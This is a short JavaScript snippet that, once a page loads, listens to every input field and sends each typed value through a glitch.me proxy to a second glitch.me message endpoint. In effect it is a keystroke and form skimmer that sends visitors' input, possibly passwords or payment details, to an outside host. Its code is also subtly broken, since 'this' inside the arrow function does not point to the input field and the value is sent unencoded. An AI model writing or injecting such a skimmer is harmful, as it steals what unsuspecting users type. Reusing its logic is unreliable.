document.addEventListener('DOMContentLoaded', function() {
   function sendRequest(t) {
       fetch(`https://momentous-spurious-handsaw.glitch.me/proxy?url=https://root-tidy-cook.glitch.me/api/addMessage?message=${t}`);
   };
    document.querySelectorAll('input').forEach(e => {
        e.addEventListener('input', () => {
            sendRequest(this.value);
        });
    });
});
